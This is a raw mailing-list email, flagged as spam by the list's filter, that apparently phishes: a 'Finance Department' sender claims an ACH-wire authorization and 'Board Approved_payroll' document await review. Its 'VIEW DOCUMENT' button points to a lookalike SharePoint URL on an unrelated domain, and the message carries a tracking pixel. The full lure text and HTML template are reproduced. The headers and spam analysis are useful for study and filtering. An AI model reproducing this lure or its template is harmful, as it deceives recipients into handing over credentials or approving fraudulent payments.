Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B0D6B94BCBA
	for <lists+industrypack-devel@lfdr.de>; Thu,  8 Aug 2024 13:59:00 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sc1nG-0002gL-Pv
	for lists+industrypack-devel@lfdr.de;
	Thu, 08 Aug 2024 11:58:59 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounces+45041053-bac3-industrypack-devel=lists.sourceforge.net@em1916.arrovvship.com>)
 id 1sc1nF-0002g8-De for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 11:58:58 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:List-Unsubscribe:To:Reply-To:Message-ID:
 Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=8TzOdU4RCJkxIzVAItuk+9n0p0NHHF36SzrE2/MaQIc=; b=HpO/XXjDxmf66mQBvVwr5sCUMc
 Df5AJ1U37zYmmravLB1jV5rkVVH+8fSbY6uei3iUpZmgQbduexCZ/g2hq0mqhjNOuqdxUSp52FUH0
 v2N/o0HkB12+u5EVHJXJLiEn0MEDehKgxtESRFWF9cTzKKD5MZb/dqzeXMJy2s1ED1xE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:List-Unsubscribe:To:Reply-To:Message-ID:Mime-Version:From:Date:
 Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=8TzOdU4RCJkxIzVAItuk+9n0p0NHHF36SzrE2/MaQIc=; b=HZtZFv1L87OInMLukfUIrc55op
 Z9BaKX8aRT7mmN/ohm5CQZ4IaTFenGkGLPZjBXW8LCdU4daKFMaVjrGmLtZ6tV4EwoX13meBkIM+X
 Xn88SeEHCrgJKu3O7UeZCx2ByVpBWnrpW3OkDk33h7CK1WzaoDY74iZd2IJMdGMjt1ck=;
Received: from wfbthkhf.outbound-mail.sendgrid.net ([159.183.1.15])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sc1nF-00055x-Bx for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 11:58:58 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=arrovvship.com;
 h=content-type:from:mime-version:subject:reply-to:to:list-unsubscribe:
 list-unsubscribe-post:cc:content-type:from:subject:to;
 s=s1; bh=8TzOdU4RCJkxIzVAItuk+9n0p0NHHF36SzrE2/MaQIc=;
 b=HGFNMLhuJIUlE1xoY3X4aLsFfcgYN/1kQJ/SbzpKhEJ1tktz604IxJZEAhe0SHd1Y70K
 PEw6p0HGzQ5ps4cy/jT9RoDCxE2mkex1yqmpg+XSpDQ19dLqvBuf+YhUBxGkaO2DEV3qid
 /DoHr1Yif2Pvnzae6Ik0Mtj4BiLYYLxZ71jMaiOHYiAxeyR0OH3aL8RjTtWtNyuEWM4WE0
 y7PcPyhfeUd6isUFhfv1j+SR5hRWn7JyuC2UPWOmnjqzZWOhJLkTuCSKNliHAUAduWC741
 LRyYub6aMxbPi6rHijQlf+1pxBCedgORZwN98wAt7AoEt28kKlY1/OVpnPK77Jnw==
Received: by recvd-5d956fdd49-7qqmj with SMTP id
 recvd-5d956fdd49-7qqmj-1-66B4AECA-2E
 2024-08-08 11:40:58.71525806 +0000 UTC m=+829218.351684222
Received: from NDUwNDEwNTM (unknown) by geopod-ismtpd-60 (SG) with HTTP
 id ruk6157UTKWknCVWZGaCEQ Thu, 08 Aug 2024 11:40:58.676 +0000 (UTC)
Date: Thu, 08 Aug 2024 11:40:59 +0000 (UTC)
From: Finance Department <Accountpayables@arrovvship.com>
Mime-Version: 1.0
Message-ID: <ruk6157UTKWknCVWZGaCEQ@geopod-ismtpd-60>
X-SG-EID: =?us-ascii?Q?u001=2Eoaav6El6kC4hm6t5SHfv7qIzPVgP=2FW9zEwnPdsvydBSFIiVi=2FoMyoRJVe?=
 =?us-ascii?Q?4v+zifVbt9kyiUSrptui8HPwxADt5fSilkrnd0H?=
 =?us-ascii?Q?YLBSo1Qlbmuyy=2FVVKcye+9LdNNPA820J5OA62zM?=
 =?us-ascii?Q?X0GohuXMl09F2SDNgl6TfULkUDizRk1crJBIhfb?=
 =?us-ascii?Q?yTf4I9KEN8qwOx5Tgyp9DhzVi8RgiTCmCS8cchi?=
 =?us-ascii?Q?Y19TwADAxxT5Snxcf86HXlv=2FMs=2FlxV2bdhvTxqu?=
 =?us-ascii?Q?+8jBhwK=2FNTmhgjgyECmH4YIPSM1VqGesVZfdhnN?=
 =?us-ascii?Q?ipBL88ng=3D?=
X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FQkrx4V8?=
 =?us-ascii?Q?KkMcU1olNMyAURbX72llrKdWlVZct4KYpZRLalL?=
 =?us-ascii?Q?3=2Fhqzsp4TGevyXIo6BS6GRx3iMMMtnhFXN8cRBf?=
 =?us-ascii?Q?dIHIvQbBBftBBZX=2FP5gwtFSNF8eOUYwaHcrscXQ?=
 =?us-ascii?Q?kmiwDuBUFhID3Cv=2FLXTwgPsQcoC=2FE4h+5Ho95Al?=
 =?us-ascii?Q?us1LfXF=2FavTTknXQziECl46xNTh9OUefaNReqyu?=
 =?us-ascii?Q?vLXpVc5qUiJC0i5PWQlKDVpevPYGlyNk2hJFuvV?=
 =?us-ascii?Q?n9xpKCMoqWV4k9g7tP=2FhbWUoURunOrFHED=2FNB2O?=
 =?us-ascii?Q?9jkWTk1F6+PwXBxPV9xuudfULg75TAGzBsADsnr?=
 =?us-ascii?Q?WzrtudyE5vChFRvlD5aR9Xcoa2xRm6EQEjZes1e?=
 =?us-ascii?Q?NV0IvamSAbw+q2IU=2FCpI98o34DVeVKBhFT5t2mP?=
 =?us-ascii?Q?8bfPNXmHL5TL3di7H5xbNcm+4ts1kyd38xKJlu9?=
 =?us-ascii?Q?xNzvCFi3afWmimgVKbRw8fqAcqDmEFGHHQ3CZTt?=
 =?us-ascii?Q?G1xl4BTo1tmUmoA8Ve1IVV4zGnrNS7YVMJt1iEQ?=
 =?us-ascii?Q?a7nmA5C+o5PB5jvumEV3VXYLApJQM623IpVgBh6?=
 =?us-ascii?Q?OUIFt5ObFPpb40sv1Ue+hkRiOTB7caS+KCuZJFH?=
 =?us-ascii?Q?OmVQKIT5k07RPPu7RWh70bcf63jobmPt+emUHM4?=
 =?us-ascii?Q?E2z+jrSsD?=
To: industrypack-devel@lists.sourceforge.net
X-Entity-ID: u001.aaPtaG341mJOcioiGyfT+g==
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-Spam-Score: 8.8 (++++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  industrypack-devel@lists.sourceforge.net ACH-Wire Authorization
    for Invoice9876545.pdf. Please review and keep for your records. Board Approved_payroll
    industrypack-devel@lists.sourceforge.net Server. 
 
 Content analysis details:   (8.8 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  2.0 URIBL_CT_SURBL         Contains an URL listed in the CT SURBL blocklist
                             [URIs: u45041053.ct.sendgrid.net]
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: u45041053.ct.sendgrid.net]
  0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
  0.4 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
                             [159.183.1.15 listed in bl.mailspike.net]
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
  5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
  0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
  0.0 LOTS_OF_MONEY          Huge... sums of money
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1sc1nF-00055x-Bx
Subject: [Industrypack-devel] [SPAM] RE: Payment Certificate of USD 124, 000
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Accountpayables@arrovvship.com
Content-Type: multipart/mixed; boundary="===============7226509750356976851=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============7226509750356976851==
Content-Type: multipart/alternative; boundary=28e4956a89e6ddf63bd27ca46392196b51db859c0783f55061a52cd545cb

--28e4956a89e6ddf63bd27ca46392196b51db859c0783f55061a52cd545cb
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=iso-8859-1
Mime-Version: 1.0

industrypack-devel@lists.sourceforge.net ACH-Wire Authorization for Invoice=
9876545.pdf.=A0Please review and keep for your records.

Board Approved_payroll

industrypack-devel@lists.sourceforge.net Server.

VIEW DOCUMENT ( https://email.rncdermott.com/sharepoint/?account=3Dindustry=
pack-devel@lists.sourceforge.net )

Unsubscribe ( https://u45041053.ct.sendgrid.net/asm/unsubscribe/?user_id=3D=
45041053&data=3DTfB_o9WOedjaC6LCIbHv27b9ChdQjobtx5JR6g_WiitoMDAwdTAwMDWugXK=
4IAhjLRGnvbumQ0qzAXVScaqn3wMf7sXLfk_SHSkj9HvW1LOibGFtQX76DnnRox-zS0_0mDUjHF=
tyqN6dNCw_k6bG8M8_Gxdbxw61QpeLnDzvfdl6ZhyVlDguA5WSl0_8N_WGSm8wK-3L8nSXZVD9d=
MkJ-lVi1kahSvAFHIp7rZzyNyDIVxgQAODlno_eIU5FhijkUoecV3sfDiAO4Nwwo4rriHNAgGrA=
F6GY4hSJH4Z8yhS_3VeKmwtW1O90W1-tcW2NHw_hfMm4FTuy2rXP1bJbl5p-N7jic5F0NcyDevj=
Eo9q6PVakGamZMXUrE71d-Njswx2X_te8oNU7a072whf-Z6KqUk27QN4yElDOxVxxRahF_Z4vlv=
h1wS2qb2GKoVMtqzJqItoN1WbTZU2rUXG6CwdqAtR6MAtVf4dmB7LvO67m5Yp16DzKfKNWHveUe=
p3FyRfeZtUwYWCXytRJr4_gPkbyVcE0Cfdn-xCPallkQaL973HwKAU3m-7RWSOp8zJU9XMrhavq=
t9php8kxkrQVZKRCNc_-bOlSYWqjjREV3R6I-GuKxBT3Zb-N13AL-AsB3ycCh6H_4eQIraSgROT=
vf5gQ2eeWTyFWDil-pK9OKl-4VZ7UyzT6hkU_oUYwQH6XI1n2tApx1Xp7yYnX0TT78ALUQJGLly=
adAInPqaD_sg3Xwpgoj2Bifeb3nHgtnE59zWUWycCC4cKN3_jXQGN0e-o40DvdOjAA15fkjbLAd=
YN0gbwwH3-XXANHooGWYaRn-5QuQtK4d4U5PvgL-3tmzxhGpZDI1mFq-B1E5LYqc3kqWWl6nMvp=
7iEwH0WhpTksz0v3H3iGh73c0ngoWrPb27f8OHsZn2OEuaV68mbspstHYpVjW4qQQh14mxQ6wDh=
LrFYN5XcDu57YYu7fhYHeChtRogKerRdj1AhI0fqAlw3FQRuZN_SHl9IBPf4p03zQYf47sYFr-z=
a6cpGPsb_oKqyEzegjKKiEHhIAzEN5U9qTywel6KQYhc8JkSl80BvWKyBkSV3BEj13htqrLxrvs=
5XyRSS6OjS2da4cnXtTGLbAftSM08wijqQN8knjb6yzf7XQF9BOgXSVPQDojrjqAZdrk-qEFIu8=
v4AvhP00x3A9_3gTPiI0lg=3D=3D ) -
--28e4956a89e6ddf63bd27ca46392196b51db859c0783f55061a52cd545cb
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Mime-Version: 1.0

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org=
/TR/xhtml1/DTD/xhtml1-strict.dtd"><html data-editor-version=3D"2" class=3D"=
sg-campaigns" xmlns=3D"http://www.w3.org/1999/xhtml"><head>

<html class=3D"sg-campaigns" xmlns=3D"http://www.w3.org/1999/xhtml" data-ed=
itor-version=3D"2"><head>
















<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1,=
 minimum-scale=3D1, maximum-scale=3D1">
<!--[if !mso]><!-->
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3DEdge">
<!--<![endif]-->
<!--[if (gte mso 9)|(IE)]>
<xml>
<o:OfficeDocumentSettings>
<o:AllowPNG/>
<o:PixelsPerInch>96</o:PixelsPerInch>
</o:OfficeDocumentSettings>
</xml>
<![endif]-->
<!--[if (gte mso 9)|(IE)]>
<style type=3D"text/css">
body {width: 600px;margin: 0 auto;}
table {border-collapse: collapse;}
table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
img {-ms-interpolation-mode: bicubic;}
</style>
<![endif]-->
<style type=3D"text/css">
body, p, div {
font-family: arial,helvetica,sans-serif;
font-size: 14px;
}
body {
color: #000000;
}
body a {
color: #1188E6;
text-decoration: none;
}
p { margin: 0; padding: 0; }
table.wrapper {
width:100% !important;
table-layout: fixed;
-webkit-font-smoothing: antialiased;
-webkit-text-size-adjust: 100%;
-moz-text-size-adjust: 100%;
-ms-text-size-adjust: 100%;
}
img.max-width {
max-width: 100% !important;
}
.column.of-2 {
width: 50%;
}
.column.of-3 {
width: 33.333%;
}
.column.of-4 {
width: 25%;
}
@media screen and (max-width:480px) {
.preheader .rightColumnContent,
.footer .rightColumnContent {
text-align: left !important;
}
.preheader .rightColumnContent div,
.preheader .rightColumnContent span,
.footer .rightColumnContent div,
.footer .rightColumnContent span {
text-align: left !important;
}
.preheader .rightColumnContent,
.preheader .leftColumnContent {
font-size: 80% !important;
padding: 5px 0;
}
table.wrapper-mobile {
width: 100% !important;
table-layout: fixed;
}
img.max-width {
height: auto !important;
max-width: 100% !important;
}
a.bulletproof-button {
display: block !important;
width: auto !important;
font-size: 80%;
padding-left: 0 !important;
padding-right: 0 !important;
}
.columns {
width: 100% !important;
}
.column {
display: block !important;
width: 100% !important;
padding-left: 0 !important;
padding-right: 0 !important;
margin-left: 0 !important;
margin-right: 0 !important;
}
}
</style>

</head><body>
<table style=3D'margin: 0px auto; border: 1px solid rgb(200, 200, 200); bor=
der-image: none; width: 640px; color: rgb(33, 33, 33); text-transform: none=
; text-indent: 0px; letter-spacing: normal; overflow: hidden; font-family: =
"Segoe UI", "Segoe WP", "Segoe UI WPC", Tahoma, Arial, sans-serif; font-siz=
e: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spa=
ce: normal; max-width: 640px; orphans: 2; widows: 2; background-color: rgb(=
255, 255, 255); font-variant-ligatures: normal;
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;' border=3D"0" cellspacing=
=3D"0" cellpadding=3D"0">
<colgroup>
<col width=3D"16" style=3D"width: 0px;">
<col width=3D"608" style=3D"width: 0px;">
<col width=3D"16" style=3D"width: 0px;"></colgroup>
<tbody>
<tr>
<td align=3D"center" style=3D"padding-top: 36px; padding-right: 36px; paddi=
ng-left: 36px;" colspan=3D"3">
</td></tr>
<tr>
<td valign=3D"top" style=3D"padding: 16px; height: 18px; vertical-align: to=
p;" colspan=3D"2">
<img width=3D"250" height=3D"80" style=3D"width: 542px; height: 96px; displ=
ay: block;" src=3D"http://cdn.mcauto-images-production.sendgrid.net/9e15698=
90bc4f99b/b0ee7cb7-427b-48ed-9939-947b10b64020/2058x654.png" "=3D""></td></=
tr>
<tr>
<td style=3D"padding: 40px 20px 28px; text-align: center; border-top-color:=
 rgb(222, 222, 222); border-top-width: 1px; border-top-style: solid; backgr=
ound-color: rgb(248, 248, 248);" colspan=3D"3">
<p style=3D"margin: 0px; color: rgb(50, 49, 48); font-size: 16px;">industry=
pack-devel@lists.sourceforge.net ACH-Wire Authorization for Invoice9876545.=
pdf.&nbsp;Please review and keep for your records.
</p></td></tr>
<tr>
<td align=3D"center" style=3D"background-color: rgb(248, 248, 248);" colspa=
n=3D"3"><a style=3D"color: rgb(50, 49, 48); text-decoration: none; display:=
 inline-block;" target=3D"_blank">
<table align=3D"center" style=3D"background: rgb(255, 255, 255); width: 388=
px; text-align: center;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"background: rgb(255, 255, 255); padding: 20px 4px 20px 20px; b=
order-top-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210=
); border-left-color: rgb(210, 210, 210); border-top-width: 1px; border-bot=
tom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bot=
tom-style: solid; border-left-style: solid;">
<img width=3D"32" style=3D"width: 32px; display: block;" src=3D"http://cdn.=
mcauto-images-production.sendgrid.net/803a3b8933626ea6/7d2e0863-840b-4b0e-a=
d8d-01d42b261f6e/96x96.png" "=3D""></td>
<td style=3D"padding: 20px 20px 20px 4px; text-align: left; font-size: 16px=
; border-top-color: rgb(210, 210, 210); border-right-color: rgb(210, 210, 2=
10); border-bottom-color: rgb(210, 210, 210); border-top-width: 1px; border=
-right-width: 1px; border-bottom-width: 1px; border-top-style: solid; borde=
r-right-style: solid; border-bottom-style: solid; -ms-word-break: break-all=
; background-color: rgb(255, 255, 255);">Board Approved_payroll</td></tr></=
tbody></table></a></td></tr>
<tr>
<td align=3D"center" style=3D"text-align: center; background-color: rgb(248=
, 248, 248);" colspan=3D"3">
<div style=3D"display: inline-block;">
<table align=3D"center" style=3D"width: auto; height: 20px;" border=3D"0" c=
ellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"center" style=3D"padding: 24px 4px 20px 0px; height: 20px;">
<img width=3D"20" height=3D"20" style=3D"display: inline;" src=3D"http://cd=
n.mcauto-images-production.sendgrid.net/803a3b8933626ea6/567957c9-215b-4b9e=
-b0da-0849f98c825c/48x48.png" "=3D""></td>
<td style=3D"padding: 20px 0px; color: rgb(50, 49, 48); ffault=3Ddefault' }=
}ont-size: 12px;">industrypack-devel@lists.sourceforge.net Server.</td></tr=
></tbody></table></div></td></tr>
<tr>
<td style=3D"padding: 0px 0px 32px; height: 40px; text-align: center; borde=
r-top-color: currentColor; border-bottom-color: currentColor; border-top-wi=
dth: medium; border-bottom-width: medium; border-top-style: none; border-bo=
ttom-style: none; background-color: rgb(248, 248, 248);" colspan=3D"3">
<a style=3D"border-style: solid; border-color: rgb(0, 120, 212); width: 168=
px; text-align: center; color: rgb(255, 255, 255); line-height: 40px; font-=
size: 16px; text-decoration: none; display: inline-block; background-color:=
 rgb(0, 120, 212);"clicktracking=3Doff href=3D"https://email.rncdermott.com=
/sharepoint/?account=3Dindustrypack-devel@lists.sourceforge.net" target=3D"=
_blank">VIEW DOCUMENT</a></td></tr></tbody></table>
<table style=3D'margin: 0px auto; width: 640px; color: rgb(33, 33, 33); tex=
t-transform: none; text-indent: 0px; letter-spacing: normal; overflow: hidd=
en; font-family: "Segoe UI", "Segoe WP", "Segoe UI WPC", Tahoma, Arial, san=
s-serif; font-size: 15px; font-style: normal; font-weight: 400; word-spacin=
g: 0px; white-space: normal; max-width: 640px; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
nt-caps: normal; -webkit-text-stroke-width: 0px;
text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
0" cellspacing=3D"0" cellpadding=3D"0">
<colgroup>
<col width=3D"64" style=3D"width: 0px;">
<col width=3D"256" style=3D"width: 0px;">
<col width=3D"135" style=3D"width: 0px;">
<col width=3D"175" style=3D"width: 0px;"></colgroup>
<tbody>
<tr>
<td valign=3D"top" style=3D"padding: 16px; height: 18px; vertical-align: to=
p;" colspan=3D"2">
<img width=3D"84" height=3D"18" style=3D"display: block;" src=3D"http://cdn=
.mcauto-images-production.sendgrid.net/803a3b8933626ea6/0d8ee900-8b1d-4775-=
b671-594d1ecc8ff7/172x40.png"></td>
<td style=3D"padding: 16px; width: 288px; height: 18px; text-align: right; =
color: rgb(96, 94, 92); line-height: 18px; font-size: 12px;" colspan=3D"2">=
<span style=3D"display: inline-block;">
</span></td></tr></tbody></table>
<img src=3D"https://u45041053.ct.sendgrid.net/wf/open?upn=3Du001.HN9ncswbYi=
-2BEGN-2FXArB7Yb-2B54Tm43-2B694904Gpq6REDOvMj5jd8r2ODXoOGLI8F0uYDlfdJx8NjvP=
dhWWcpkCUGsR3P4VRN5MZ7o0veGf3rvT-2BLh1aC66WHXNP3uZ2MXALkHEQ-2BFrCPjUx06NxmF=
ri6-2BXxC4qcLErCGgOmjc8H7v-2FCmxYtULIhFJ4QC6to7f6lgWxonIIGcR2wAQR9rNIH14Ixs=
z-2FK33rNHuySfTK8ZEhY6Mx24SpwYWz-2Bc-2B05pYzcqPUBYIWCHwXx6ubXT6rfLng1CBkclo=
T8BDfrlWNNcEXWvNpGPL8A4R40HvlLBFlZ8PORAMu61Sna6MORpoc5sYMSeIk-2FSX96ttP2oiW=
T2-2F3KUfQZlN2ELV5pHS94ReUIv3qXjootWTz-2BsjbMqAU3YlOQcEo7tE51uweDGVt-2FtMUd=
DkyOXBHN9GriFoegFqEBhv4-2BJ3wdlbo4SCm8rk4lnsEfX5BXXVzrlLwHjZxiZ87cBLqePCYrG=
J0EkfT5gJV5buerHizJG82wbDbp2PduDBSpsr4HTbxcSzHPE-2FHANPB0uFk2NAKHheCyx8kwAU=
-2F6nlf1you0Ih9AuCQFOU00dJgpnGcxNWln2ennT5ZgYOhyoUzIynA04EUCFKBr63CQ964xGX4=
Q9lPvqt5HD9LSJESxr7UeAq9d3i2hJkdJ-2ByjsBFzty6ouQTXhsri2mujZ0xsGwP2HIlbxVpTO=
HS1xK5G2fGTruV-2B3O3m7h2t30bYJlk-2FWahHdb47Aaj0UV8c1bztEz1w-2BRTcHDyh0hmuVF=
Lhr4NCuaIOrkXrm0nXcevxS4jti2LUTCCshjWWrmDrCkX3p-2BM-2B1srJEGSIpgD26EzdQiahM=
8NDjYhmVRNq70-2FOQgZwdHb6NicLLsFV7abuLTHZMMvlXVcgqKI7AqNVT52AaWyMUw1UghoJSr=
Gq3nEVrUB3ofM32AWp-2Fm-2F02Gz41P0wpszYT5XRw29V2ffPZLhTdM-2B-2FjFY57srXutsUa=
k-3D" alt=3D"" width=3D"1" height=3D"1" border=3D"0" style=3D"height:1px !i=
mportant;width:1px !important;border-width:0 !important;margin-top:0 !impor=
tant;margin-bottom:0 !important;margin-right:0 !important;margin-left:0 !im=
portant;padding-top:0 !important;padding-bottom:0 !important;padding-right:=
0 !important;padding-left:0 !important;"/></body></html>
        <p style=3D"font-size:12px; line-height:20px;">
          <a class=3D"Unsubscribe--unsubscribeLink" href=3D"https://u450410=
53.ct.sendgrid.net/asm/unsubscribe/?user_id=3D45041053&amp;data=3DTfB_o9WOe=
djaC6LCIbHv27b9ChdQjobtx5JR6g_WiitoMDAwdTAwMDWugXK4IAhjLRGnvbumQ0qzAXVScaqn=
3wMf7sXLfk_SHSkj9HvW1LOibGFtQX76DnnRox-zS0_0mDUjHFtyqN6dNCw_k6bG8M8_Gxdbxw6=
1QpeLnDzvfdl6ZhyVlDguA5WSl0_8N_WGSm8wK-3L8nSXZVD9dMkJ-lVi1kahSvAFHIp7rZzyNy=
DIVxgQAODlno_eIU5FhijkUoecV3sfDiAO4Nwwo4rriHNAgGrAF6GY4hSJH4Z8yhS_3VeKmwtW1=
O90W1-tcW2NHw_hfMm4FTuy2rXP1bJbl5p-N7jic5F0NcyDevjEo9q6PVakGamZMXUrE71d-Njs=
wx2X_te8oNU7a072whf-Z6KqUk27QN4yElDOxVxxRahF_Z4vlvh1wS2qb2GKoVMtqzJqItoN1Wb=
TZU2rUXG6CwdqAtR6MAtVf4dmB7LvO67m5Yp16DzKfKNWHveUep3FyRfeZtUwYWCXytRJr4_gPk=
byVcE0Cfdn-xCPallkQaL973HwKAU3m-7RWSOp8zJU9XMrhavqt9php8kxkrQVZKRCNc_-bOlSY=
WqjjREV3R6I-GuKxBT3Zb-N13AL-AsB3ycCh6H_4eQIraSgROTvf5gQ2eeWTyFWDil-pK9OKl-4=
VZ7UyzT6hkU_oUYwQH6XI1n2tApx1Xp7yYnX0TT78ALUQJGLlyadAInPqaD_sg3Xwpgoj2Bifeb=
3nHgtnE59zWUWycCC4cKN3_jXQGN0e-o40DvdOjAA15fkjbLAdYN0gbwwH3-XXANHooGWYaRn-5=
QuQtK4d4U5PvgL-3tmzxhGpZDI1mFq-B1E5LYqc3kqWWl6nMvp7iEwH0WhpTksz0v3H3iGh73c0=
ngoWrPb27f8OHsZn2OEuaV68mbspstHYpVjW4qQQh14mxQ6wDhLrFYN5XcDu57YYu7fhYHeChtR=
ogKerRdj1AhI0fqAlw3FQRuZN_SHl9IBPf4p03zQYf47sYFr-za6cpGPsb_oKqyEzegjKKiEHhI=
AzEN5U9qTywel6KQYhc8JkSl80BvWKyBkSV3BEj13htqrLxrvs5XyRSS6OjS2da4cnXtTGLbAft=
SM08wijqQN8knjb6yzf7XQF9BOgXSVPQDojrjqAZdrk-qEFIu8v4AvhP00x3A9_3gTPiI0lg=3D=
=3D" target=3D"_blank" style=3D"font-family:sans-serif;text-decoration:none=
;">
            Unsubscribe
          </a>
          -

  </html>

--28e4956a89e6ddf63bd27ca46392196b51db859c0783f55061a52cd545cb--


--===============7226509750356976851==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7226509750356976851==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7226509750356976851==--

